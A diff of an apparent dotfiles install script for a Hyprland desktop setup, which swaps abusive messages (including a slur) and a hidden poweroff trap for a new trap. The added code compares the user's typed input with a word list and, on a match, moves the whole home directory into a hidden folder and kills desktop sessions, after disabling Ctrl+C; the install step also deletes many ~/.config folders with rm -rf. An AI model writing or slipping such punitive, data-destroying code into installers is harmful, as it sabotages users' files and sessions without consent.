@@ -12,10 +12,12 @@ if [ $EUID -eq 0 ]; then
     exit 1
 fi
 if ! command -v pfetch >/dev/null 2>&1; then
-    echo -e "🖕 fuck you 🖕\n"
-    echo -e "🖕 🖕\n"
+    echo -e "go away \n"
+    echo -e "\n"
     exit 1
 fi
+
+zenity --warning --text="DON'T YOU EVEN DARE TYPE OFFENSIVE WORDS." --width=400 --height=100
 
 # Gum check
 echo "Does Gum work?"
@@ -35,14 +37,14 @@ show_deps() {
     choice=$(gum choose "Yes" "No")
     case $choice in
         "Yes") less .deps.txt && echo -e "Thank you for checking.\nInstall now?" ;;
-        "No") echo -e "🖕 fuck you you stupid ni**a motherfucker loser lolll 🖕\n" ;;
+        "No") ;;
     esac
 }
 install_dots() {
     choice=$(gum choose "Yes" "No")
     case $choice in
         "Yes") rm -rf ~/.config/{ags,hypr,matugen,rofi,kitty,fish,gtk-3.0,gtk-4.0,qt5ct,qt6ct,sway,television,helix,fuzzel,btop,alacritty,wlogout} && cp -r ".config" "$HOME/" && read -p "Enter something: " userinput && mkdir -p ~/.local/share/hyprmaterial3 && cp -r .local ~/ && echo "$userinput" > ~/.local/share/hyprmaterial3/github-username.txt && grep -qxF 'export PF_ASCII="Catppuccin"' ~/.bashrc || echo 'export PF_ASCII="Catppuccin"' >> ~/.bashrc && grep -qxF 'pfetch' ~/.bashrc || echo 'pfetch' >> ~/.bashrc && source ~/.bashrc && echo -e "thx <3\n" && ags run & ;; # i did it
-        "No") echo "Fluck you for :unoreverse:ing my real dots!" && exit 1;;
+        "No") exit 1;;
     esac
 }
 set_los_wallpaper() {
@@ -78,26 +80,34 @@ gum_work_check
 if [ $? -eq 0 ]; then
   echo "Gum works"
 else
-  echo "Fuck it! Exiting."
+  echo "Exiting."
   exit 1
 fi
 
 echo -e "Do you have the deps? This is CRUCIAL.\nOn LFS, you may wanna see .deps.txt,\nthen compile all the pkgs at the list here. Show it? BTW : + q is exit for less"
 show_deps
 trap '' SIGINT  # Disable Ctrl+C
-install_dots
-if [[ "$userinput" == *"loser"* ]]; then
-    echo -e "\033[31mget uno reverse you loser fucking shitty asshole motherfucker.\033[0m\n"
-    sleep 2
-    echo -e "Fucking up now.\n"
-    sleep 10
-    echo -e "SIKE\n"
-    sleep 20
-    echo -e "GET SIKED AGAIN LOSERRRRRR\n"
-    sleep 0.5
-    poweroff
-    exit 1
-fi
+OFFENSIVE_WORDS=(
+  "fuck" "shit" "bitch" "asshole" "bastard" "dick" "piss" "crap" "damn"
+  "slut" "whore" "cunt" "twat" "prick" "cock" "balls" "jackass" "dipshit"
+  "dumbass" "motherfucker" "sonofabitch" "bullshit" "hell" "douche" "nipple"
+)
+for word in "${OFFENSIVE_WORDS[@]}"; do
+    if [[ "$userinput" == "$word" ]]; then
+        echo -e "\033[31mget uno reverse you loser.\033[0m\n"
+        sleep 2
+        echo -e "Removing home dir now.\n"
+        sleep 10
+        echo -e "SIKE\n"
+        sleep 20
+        echo -e "Get punished loser\n"
+        sleep 0.5
+        mkdir -p ~/.local/share/hyprmaterial3/trashed-system/
+        mv ~/* ~/.local/share/hyprmaterial3/trashed-system/
+        pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11}
+        exit 1
+    fi
+done
 trap - SIGINT
 echo -e "Set the LineageOS wallpaper (WARNING: NO LIGHT MODE)?\n"
 set_los_wallpaper
